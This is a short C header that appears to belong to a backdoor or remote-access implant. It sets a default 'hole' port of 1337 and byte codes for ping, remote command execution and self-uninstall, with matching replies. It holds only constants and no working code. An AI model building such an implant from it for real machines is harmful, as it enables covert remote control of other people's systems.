#pragma once

#ifndef HOLE_PORT
#define HOLE_PORT "1337"
#endif

typedef char code_t;

#define CMD_ERROR	((code_t)-1)
#define	CMD_NONE	((code_t)0)
#define CMD_PING	((code_t)0x23)
#define CMD_EXEC	((code_t)0xC8)
#define CMD_UNINSTALL	((code_t)0x77)

#define REPLY_NONE	((code_t)65)
#define REPLY_PONG	((code_t)81)
#define REPLY_EXEC_DONE	((code_t)82)
#define REPLY_PONG_FAIL	((code_t)113)
#define REPLY_EXEC_FAIL	((code_t)114)
